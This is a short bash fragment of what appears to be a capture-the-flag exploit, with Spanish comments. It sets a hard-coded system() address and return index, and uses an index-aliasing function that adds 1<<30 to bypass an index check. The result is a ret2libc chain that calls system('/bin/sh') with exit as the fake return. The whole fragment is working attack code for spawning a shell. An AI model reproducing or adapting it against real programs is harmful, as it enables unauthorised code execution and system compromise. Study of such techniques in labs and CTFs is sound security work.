N=114                   # RET_INDEX real
SYSTEM=0xf7e6aed0       # p system

alias_idx(){ local n=$1; if (( n % 3 != 0 )); then echo $n; else echo $(( n + (1<<30) )); fi; }
I0=$(alias_idx $N)          # ret        -> system
I1=$(alias_idx $((N+1)))    # ret falso  -> exit
I2=$(alias_idx $((N+2)))    # argumento  -> /bin/sh
